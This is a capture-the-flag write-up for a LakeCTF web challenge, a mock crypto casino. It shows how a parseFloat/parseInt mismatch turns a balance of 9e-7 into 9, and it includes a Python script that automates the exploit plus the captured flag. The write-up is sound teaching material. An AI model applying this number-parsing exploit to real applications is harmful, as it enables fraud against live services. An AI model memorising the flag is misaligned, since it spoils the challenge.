---
title: gamblecore
challenge_type: Web
writeup_author: "@xabito"
competition: lakectf-25-26-quals
summary: |-
  Let's go gambling!
connections:
  - url: https://chall.polygl0ts.ch:8148/
attachments:
  - title: gamblecore.zip
    url: /assets/files/lakectf-25-26-quals/gamblecore/gamblecore.zip
---

## Recon

When we open the challenge in the browser, we see a crypto casino where the goal is to win enough coins to reach $10 and get the flag.

![Landing page](/assets/files/lakectf-25-26-quals/gamblecore/website.png)

Looking through the website code, particularly the `server.js` file, we see that the win rate is about 9%. This rate is too low to rely on luck, so we need to find another method.

When we examine the code for the `/api/gamble` and `/api/convert` endpoints, we notice a key difference that appears to be the main vulnerability:

```javascript
app.post('/api/gamble', (req, res) => {
    ...
    let betAmount = parseFloat(amount);
    if (isNaN(betAmount) || betAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    ...
});

app.post('/api/convert', (req, res) => {
    ...
    amount = parseInt(amount);
    if (isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    ...
});
```

The gamble endpoint uses `parseFloat`, while the convert endpoint uses `parseInt`. This creates a subtle vulnerability, since JavaScript always converts the arguments to strings before applying these functions.

When a float value is extremely large or small, JavaScript represents it in scientific notation. Since the value is treated as a string and `parseInt` tries to extract a valid integer from the beginning of the string, we can use this behavior to turn a very small float into a much larger number:

```javascript
> 0.000009
0.000009
> 0.0000009
9e-7
> parseInt(9e-7)
9
```

By intentionally losing enough coins, we can make our balance small enough that it is displayed in scientific notation. Then, when we convert this amount to USD, the vulnerability lets us turn it into a much higher value.

![Wins after loses](/assets/files/lakectf-25-26-quals/gamblecore/gamble.png)

At this point, we just need to keep gambling until our balance reaches at least $10. Although we are still relying on luck, we only need to win four times in a row (from $0.09 to $0.9, then to $9, and finally to $90).

## Exploitation

With only a 9% chance of winning each gamble, it is technically possible to reach the required amount, but doing it by hand would take hundreds of attempts. To automate the process, let's use a script:

```python
import requests

BASE_URL = "https://chall.polygl0ts.ch:8148/"

def single_attempt(attempt_no):
    sess = requests.Session()

    # step 1: gamble and lose
    r = sess.post(
      f"{BASE_URL}/api/gamble",
      json={"currency": "coins", "amount": 0.0000091}
    )

    data = r.json()

    if data.get("win", False):
        # we won the gamble, skip attempt
        return None

    # step 2: convert to usd
    r = sess.post(
      f"{BASE_URL}/api/convert",
      json={"amount": 9}
    )

    # step 3: gamble until enough money
    usd = 0.09
    while usd < 10:
        r = sess.post(
          f"{BASE_URL}/api/gamble",
          json={"currency": "usd", "amount": usd}
        )

        data = r.json()
        usd = data.get("new_balance", 0.0)
        if usd == 0:
          # we lost the gamble, skip attempt
          return None

    # step 4: gather flag
    r = sess.post(f"{BASE_URL}/api/flag")
    return r.text

i = 0
while True:
    flag = single_attempt(i)
    if flag:
        print(flag)
        break
    i += 1
    if i % 50 == 0:
        print(f"[-] {i} attempts tried...")
```

## Flag capture

Simply run the script and wait a few minutes. With some patience, you will eventually get lucky:

```bash
$ python extract_flag.py
[-] 50 attempts tried...
[-] 100 attempts tried...
[-] 150 attempts tried...
[-] 200 attempts tried...
[-] 250 attempts tried...
[-] 300 attempts tried...
[-] 350 attempts tried...
[-] 400 attempts tried...
[-] 450 attempts tried...
[-] 500 attempts tried...
[-] 550 attempts tried...
[-] 600 attempts tried...
[-] 650 attempts tried...
{"flag":"EPFL{we_truly_live_in_a_society}"}
```